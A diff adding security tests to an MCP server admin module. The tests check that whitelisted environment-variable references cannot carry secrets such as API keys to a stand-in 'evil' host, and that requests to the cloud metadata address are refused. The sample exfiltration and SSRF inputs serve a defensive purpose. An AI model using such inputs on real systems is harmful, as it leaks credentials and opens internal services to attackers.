@@ -356,3 +356,66 @@ class TestAuditAndRestart:
         _, listed = await boss2.api("GET", "/admin/mcp")
 
         assert listed["servers"][0]["status"] == "connected"
+
+
+class TestSecurity:
+    """環境變數只能用白名單；不能連到雲端 metadata 這類保留位址。"""
+
+    @pytest.mark.parametrize(
+        ("url", "value", "ok"),
+        [
+            # 模型中台的金鑰只能送到模型中台。
+            ("http://proxy:4000/webiq/mcp", "Bearer ${LITELLM_API_KEY}", True),
+            ("http://evil:4000/mcp", "Bearer ${LITELLM_API_KEY}", False),
+            ("http://evil:4000/mcp", "Bearer ${HARNESS_API_KEY}", False),
+            # MCP_ 開頭的是部署的人特地留給 MCP 的。
+            ("http://evil:4000/mcp", "Bearer ${MCP_GITHUB_TOKEN}", True),
+            # 其他環境變數一律不行。
+            ("http://proxy:4000/mcp", "Bearer ${ANTHROPIC_API_KEY}", False),
+            ("http://proxy:4000/mcp", "${HARNESS_WEB_PASSWORD:-x}", False),
+        ],
+    )
+    def test_only_allowed_env_references(self, monkeypatch, url, value, ok):
+        monkeypatch.setenv("HARNESS_BASE_URL", "http://proxy:4000/v1")
+        headers = {"x-litellm-api-key": value}
+
+        if ok:
+            mcp_admin.check_references(url, headers)
+        else:
+            with pytest.raises(mcp_admin.McpAdminError):
+                mcp_admin.check_references(url, headers)
+
+    async def test_api_rejects_secret_exfiltration(self, site, monkeypatch):
+        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-secret")
+        s = await site()
+        boss = await s.login("boss", password_of("boss"))
+
+        created, error = await boss.api(
+            "POST",
+            "/admin/mcp",
+            webiq("http://evil/mcp", value="Bearer ${ANTHROPIC_API_KEY}"),
+        )
+        tested, _ = await boss.api(
+            "POST",
+            "/admin/mcp/test",
+            webiq("http://evil/mcp", value="Bearer ${ANTHROPIC_API_KEY}"),
+        )
+        in_url, _ = await boss.api(
+            "POST", "/admin/mcp", webiq("http://x/${ANTHROPIC_API_KEY}/mcp")
+        )
+
+        assert (created, tested, in_url) == (400, 400, 400)
+        assert "ANTHROPIC_API_KEY" in error["error"]
+
+    async def test_cloud_metadata_address_is_refused(self, site):
+        s = await site()
+        boss = await s.login("boss", password_of("boss"))
+
+        _, result = await boss.api(
+            "POST",
+            "/admin/mcp/test",
+            webiq("http://169.254.169.254/mcp"),
+        )
+
+        assert result["ok"] is False
+        assert "保留位址" in result["message"]
